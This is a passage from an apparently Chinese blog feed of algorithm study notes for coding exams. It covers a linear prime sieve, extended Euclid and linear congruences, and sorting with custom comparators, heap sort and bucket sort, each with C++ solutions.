class="hljs-number">-2</span>;i&gt;=<span class="hljs-number">0</span>;i--) a[i] = a[i+<span class="hljs-number">1</span>] * nums[i+<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++) c[i] = a[i] * b[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++) cout&lt;&lt;c[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    cout&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p>优化做法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> nums[N],n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;nums[i];<br>    <span class="hljs-type">int</span> b[N],temp = <span class="hljs-number">1</span>;<br>    b[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;n;i++) b[i] = b[i<span class="hljs-number">-1</span>] * nums[i<span class="hljs-number">-1</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = n - <span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--)&#123;<br>        b[i] = b[i] * temp;<br>        temp = temp * nums[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++) cout&lt;&lt;b[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    cout&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure><h1 id="线性筛">线性筛</h1><h2 id="筛素数">筛素数</h2><p>给定一个正整数 n𝑛，请你求出 1∼n1∼𝑛 中质数的个数。</p><h3 id="输入格式-7">输入格式</h3><p>共一行，包含整数 n𝑛。</p><h3 id="输出格式-7">输出格式</h3><p>共一行，包含一个整数，表示 1∼n1∼𝑛 中质数的个数。</p><h3 id="数据范围-2">数据范围</h3><p>1≤n≤1061≤𝑛≤106</p><h3 id="输入样例-2">输入样例：</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">8<br></code></pre></td></tr></table></figure><h3 id="输出样例-2">输出样例：</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">4<br></code></pre></td></tr></table></figure><h2 id="代码-7">代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e6</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> prime[N],n,cnt;<br><span class="hljs-type">bool</span> state[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>;i&lt;=n;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!state[i])&#123;<br>            prime[cnt++] = i;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;prime[j] &lt;= n / i ;j++)&#123;<br>            state[prime[j] * i] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span>(i % prime[j] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;cnt&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="理解">理解</h2><p>线性筛保证每次合数只被筛一次，通过将合数分解成<spanclass="math inline">\(x=prime[j]*i\)</span>,其中<spanclass="math inline">\(prime[j]\)</span>是<spanclass="math inline">\(x\)</span>的最小质因子。</p><p><strong>如何保证<span class="math inline">\(prime[j]\)</span>是<spanclass="math inline">\(x\)</span>的最小质因子？</strong></p><p>当<span class="math inline">\(i\space\ \% \space\ prime[j]\space\ !=0\)</span>说明<span class="math inline">\(prime[j]\)</span>比<spanclass="math inline">\(i\)</span>的最小质因子还要小，当<spanclass="math inline">\(i\space\ \% \space\ prime[j]\space\ ==0\)</span>的时候，<span class="math inline">\(prime[j]\)</span>是<spanclass="math inline">\(i\)</span>的质因子，因为我们是从小到达遍历质数，所以当<spanclass="math inline">\(i\space\ \% \space\ prime[j]\space\ ==0\)</span>时停止遍历，就能保证<spanclass="math inline">\(x=prime[j]*i\)</span>中<spanclass="math inline">\(prime[j]\)</span>是<spanclass="math inline">\(x\)</span>的最小质因子，否则我们不能保证<spanclass="math inline">\(prime[j]\)</span>是<spanclass="math inline">\(i\)</span>和<spanclass="math inline">\(x\)</span>的最小质因数。</p><h1 id="扩展欧几里得算法">扩展欧几里得算法</h1><h2 id="acwing877-扩展欧几里得算法">acwing877 <ahref="https://www.acwing.com/problem/content/879/">扩展欧几里得算法</a></h2><p>给定<span class="math inline">\(n\)</span>对正整数<spanclass="math inline">\(a_{i} b_{i}\)</span>，对于每对数，求出一组<spanclass="math inline">\(x_{i} y_{i}\)</span>，使其满足<spanclass="math inline">\(a_{i} x_{i} + b_{i} y_{i} =gcd(a_{i},b_{i})\)</span></p><h3 id="输入格式-8">输入格式</h3><p>第一行包含整数 <span class="math inline">\(n\)</span>。</p><p>接下来 <span class="math inline">\(n\)</span>行，每行包含两个整数<span class="math inline">\(a_{i} b_{i}\)</span></p><h3 id="输出格式-8">输出格式</h3><p>输出共<span class="math inline">\(n\)</span>行，对于每组<spanclass="math inline">\(a_{i} b_{i}\)</span>，求出一组满足条件的<spanclass="math inline">\(x_{i} y_{i}\)</span>，每组结果占一行。</p><p>本题答案不唯一，输出任意满足条件的<span class="math inline">\(x_{i}y_{i}\)</span>均可。</p><h3 id="数据范围-3">数据范围</h3><p><span class="math inline">\(1\le n\le 10^{5}\)</span> <spanclass="math inline">\(1 \le a_{i} ,b_{i} \le 2 \times10^{9}\)</span></p><h3 id="输入样例-3">输入样例：</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">2</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">6</span><br><span class="hljs-symbol">8 </span><span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><h3 id="输出样例-3">输出样例：</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-1 1</span><br><span class="hljs-deletion">-2 1</span><br></code></pre></td></tr></table></figure><h3 id="代码解决方法">代码解决方法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// ax1 + by1 = gcd(a, b) = gcd(b,a % b)</span><br><span class="hljs-comment">// bx2 + (a - a / b * b)y2 = ax1 + by1</span><br><span class="hljs-comment">// bx2 + ay2 - a / b * y2 = ay2 + b(x2 - a / b * y2)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">exgcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> &amp;x, <span class="hljs-type">int</span> &amp;y)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(b == <span class="hljs-number">0</span>)&#123;<br>        x = <span class="hljs-number">1</span>, y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">exgcd</span>(b, a % b, x, y);<br>        <span class="hljs-type">int</span> t = x;<br>        x = y;<br>        y = t - a / b * y;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)&#123;<br>        <span class="hljs-type">int</span> a,b,x,y;<br>        cin&gt;&gt;a&gt;&gt;b;<br>        <span class="hljs-built_in">exgcd</span>(a,b,x,y);<br>        cout&lt;&lt;x&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;y&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="acwing878-线性同余方程">acwing878 <ahref="https://www.acwing.com/problem/content/880/">线性同余方程</a></h2><p>给定n组数据<span class="math inline">\(a_{i} \space b_{i} \spacem_{i}\)</span>，对于每组数求出一个<spanclass="math inline">\(x_{i}\)</span>，使其满足 <spanclass="math inline">\(a_{i} \space x_{i} \equiv b(mod \space \spacem_{i})\)</span>，如果无解则输出 <code>impossible</code>。</p><h3 id="输入格式-9">输入格式</h3><p>第一行包含整数 n。</p><p>接下来 n 行，每行包含一组数据 <span class="math inline">\(a_{i}\space b_{i} \space m_{i}\)</span>。</p><h3 id="输出格式-9">输出格式</h3><p>输出共 n𝑛行，每组数据输出一个整数表示一个满足条件的<spanclass="math inline">\(x_{i}\)</span>，如果无解则输出<code>impossible</code>。</p><p>每组数据结果占一行，结果可能不唯一，输出任意一个满足条件的结果均可。</p><p>输出答案必须在 int范围之内。</p><h3 id="数据范围-4">数据范围</h3><p><span class="math inline">\(1\le n \le 10^{5}\)</span> <spanclass="math inline">\(1 \le a_{i},b_{i},m_{i} \le 2 \times10^{9}\)</span></p><h3 id="输入样例-4">输入样例：</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">3</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h3 id="输出样例-4">输出样例：</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs diff">impossible<br><span class="hljs-deletion">-3</span><br></code></pre></td></tr></table></figure><h3 id="代码解决方案">代码解决方案</h3><p>因为<span class="math inline">\(ax \equiv b(mod \space \spacem)\)</span>等价于<span class="math inline">\(ax - b\)</span>是<spanclass="math inline">\(m\)</span>的倍数，因此线性同余方程问题可以转化为<spanclass="math inline">\(ax + my = b\)</span></p><p>根据裴蜀定理</p><blockquote><p>裴蜀定理（或贝祖定理）得名于法国数学家艾蒂安·裴蜀，说明了对任何整数a、b和它们的<ahref="https://baike.baidu.com/item/最大公约数/869308?fromModule=lemma_inlink">最大公约数</a>d，关于未知数x和y的线性<ahref="https://baike.baidu.com/item/不定方程/6815217?fromModule=lemma_inlink">不定方程</a>（称为裴蜀等式）：若a,b是整数,且<ahref="https://baike.baidu.com/item/gcd/24166657?fromModule=lemma_inlink">gcd</a>(a,b)=d，那么对于任意的整数x,y,ax+by都一定是d的倍数，特别地，一定存在整数x,y，使ax+by=d成立。</p><p>它的一个重要推论是：a,b<ahref="https://baike.baidu.com/item/互质/577412?fromModule=lemma_inlink">互质</a>的<ahref="https://baike.baidu.com/item/充分必要条件/10943559?fromModule=lemma_inlink">充分必要条件</a>是存在整数x,y使ax+by=1.</p></blockquote><p>所以上述方案有解的充分必要条件是<span class="math inline">\(gcd(a,m)| b\)</span></p><p>所以先对<span class="math inline">\(ax + my =b\)</span>使用扩展欧几里得算法得到x，然后再对x进行放缩(<spanclass="math inline">\(b / gcd(a,m)\)</span>)即可得到答案</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">exgcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b,<span class="hljs-type">int</span> &amp;x,<span class="hljs-type">int</span> &amp;y)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(b == <span class="hljs-number">0</span>)&#123;<br>        x = <span class="hljs-number">1</span>,y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-type">int</span> d = <span class="hljs-built_in">exgcd</span>(b,a % b, x,y);<br>    <span class="hljs-type">int</span> t = x;<br>    x = y;<br>    y = t - a / b * y;<br>    <span class="hljs-keyword">return</span> d;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)&#123;<br>        <span class="hljs-type">int</span> a,b,m,x,y;<br>        cin&gt;&gt;a&gt;&gt;b&gt;&gt;m;<br>        <span class="hljs-type">int</span> d = <span class="hljs-built_in">exgcd</span>(a,m,x,y);<br>        <span class="hljs-keyword">if</span>(b % d) cout&lt;&lt;<span class="hljs-string">&quot;impossible&quot;</span>&lt;&lt;endl;<br>        <span class="hljs-keyword">else</span> cout&lt;&lt;(ll)x * b / d % m&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>保研</tag>
      
      <tag>机试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法学习</title>
    <link href="/2022/10/23/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/10/23/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="排序">排序</h1><h2 id="sort函数sort和cmp配合使用">sort函数（sort和cmp配合使用）</h2><p>sort函数（c++）可以对数据进行排序和自定义排序（cmp配合使用）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">从小到大排序可以写成<br><span class="hljs-built_in">sort</span>(a,a+n,<span class="hljs-built_in">less</span>&lt;要进行排序的数据类型&gt;())<span class="hljs-comment">//a是数组的首地址，a+n是数组的尾地址(也可以是结构体数组)</span><br>从大到小排序可以写成<br><span class="hljs-built_in">sort</span>(a,a+n,<span class="hljs-built_in">greater</span>&lt;要进行排序的数据类型&gt;())<br><br></code></pre></td></tr></table></figure><p>sort可以和cmp函数配合使用进行自定义的结构体排序：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-comment">//定义结构体</span><br>&#123;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">100</span>];<br>    <span class="hljs-type">double</span> a,b,c;<br>    <span class="hljs-type">double</span> sum;<br>&#125;student;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(<span class="hljs-type">const</span> student &amp;a,<span class="hljs-type">const</span> student &amp;b)</span><span class="hljs-comment">//cmp函数原型，其中形参要取地址，因为要变换原数据的位置</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(a.sum!=b.sum) <span class="hljs-keyword">return</span> a.sum&gt;b.sum;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a.a!=b.a) <span class="hljs-keyword">return</span> a.a&gt;b.a;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a.b!=b.b) <span class="hljs-keyword">return</span> a.b&gt;b.b;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> a.c&gt;b.c;<br>&#125;<br><span class="hljs-comment">//cmp函数返回为true时不会变化位置，当返回false时会变换位置，所以return a.c&gt;b.c就是降序排列，return a.c&lt;b.c就是升序排序</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    student a[<span class="hljs-number">10</span>];<br>    <span class="hljs-built_in">sort</span>(a,a+n,cmp);<span class="hljs-comment">//进行自定义排序</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="堆排序">堆排序</h2><p><strong>分析1：为什么从无序数组创建堆要从n/2开始？</strong></p><p>因为堆为完全二叉树，完全二叉树中父亲和儿子的地址拥有如下关系：<strong>父亲X2=左儿子，父亲X2+1=右儿子，左儿子/2=右儿子/2=父亲</strong>。</p><p><strong>分析2：升序和降序如何选择大根堆或者小根堆？</strong></p><p>在升序中通常采用小根堆，在降序中采用大根堆。因为用数组模拟堆时，删除首元素比较麻烦，但是删除最后一个元素非常方便，直接让首元素等于最后一个元素，然后在不断down首元素得到正确的堆</p><p><strong>分析3：为什么在down()函数中要不断递归呢？</strong></p><p>因为创建堆的时候，当父亲比两个儿子都大的时候，我们找到三个中最小的一个，并交换位置，但是我们并不知道父亲在整个堆的位置，所以我们要不断down来正确找到父亲的位置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//这里填你的代码^^</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> h[N],tt;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">down</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t=x;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*x&lt;=tt&amp;&amp;h[<span class="hljs-number">2</span>*x]&lt;h[t]) t=<span class="hljs-number">2</span>*x;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>&lt;=tt&amp;&amp;h[<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>]&lt;h[t]) t=<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>;<span class="hljs-comment">//算出自己和自己的儿子谁小</span><br>    <span class="hljs-keyword">if</span>(t!=x)<span class="hljs-comment">//如果自己的儿子比自己小，就交换数值，并且递归让自己到达正确的位置</span><br>    &#123;<br>        <span class="hljs-built_in">swap</span>(h[x],h[t]);<br>        <span class="hljs-built_in">down</span>(t);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    tt=n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) cin&gt;&gt;h[i];<span class="hljs-comment">//输入是无序的</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=n/<span class="hljs-number">2</span>;i&gt;<span class="hljs-number">0</span>;i--) <span class="hljs-built_in">down</span>(i);<span class="hljs-comment">//为啥创建堆时权重是从n/2开始，因为最后一层不用进行堆的排序</span><br>    <span class="hljs-comment">//要从最后一层的上一层开始，而父亲和儿子的权重关系是i(父亲)=i(儿子)*2</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>    &#123;<br>        cout&lt;&lt;h[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<span class="hljs-comment">//最小的数，就是堆权重最小的数</span><br>        h[<span class="hljs-number">1</span>]=h[tt--];<span class="hljs-comment">//因为数组删除第一个元素时很困难的，所以直接将堆最后一位赋值到第一位</span><br>        <span class="hljs-built_in">down</span>(<span class="hljs-number">1</span>);<span class="hljs-comment">//然后再判断该数是否在正确的位置</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//注意代码要放在两组三个点之间，才可以正确显示代码高亮哦~</span><br></code></pre></td></tr></table></figure><h2 id="桶排序">桶排序</h2><p>桶排序可以解决数据过多导致超时的情况，也可以计算计算得票数量类的题型</p><p>整个过程：</p><figure><img src="https://s2.loli.net/2022/01/23/oADHGJ94uVLsKUp.png"alt="image-20220123164040471" /><figcaption aria-hidden="true">image-20220123164040471</figcaption></figure><p>例题：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tap">为了找出林大2020新生中最擅长编写代码的同学，学校发起了一场投票。通过同学报名、前期遴选等环节，共提名了100名同学作为选举人进行评选，假设他们的编号从1到100。现在学院已经采集到了n名同学的投票结果，请你找出得票最多的程序员获得的票数(注：就是让你找相同数字的个数的最大值)。<br>输入样例1：<br>6<br>1<span class="hljs-number"> 2 </span>4<span class="hljs-number"> 7 </span>7 7<br>4<br>5<span class="hljs-number"> 5 </span>5 5<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> a[<span class="hljs-number">200</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,t;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;n)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(a,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(a));<span class="hljs-comment">//将数组初始化为0</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<span class="hljs-comment">//进行桶排序</span><br>            cin&gt;&gt;t;<br>            a[t]++;<br>        &#125;<br>        <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">100</span>;i++) ans=<span class="hljs-built_in">max</span>(ans,a[i]);<span class="hljs-comment">//运用了max函数，max(a,b)函数会返回大的数</span><br>        cout&lt;&lt;ans&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="快速排序">快速排序</h2><figure 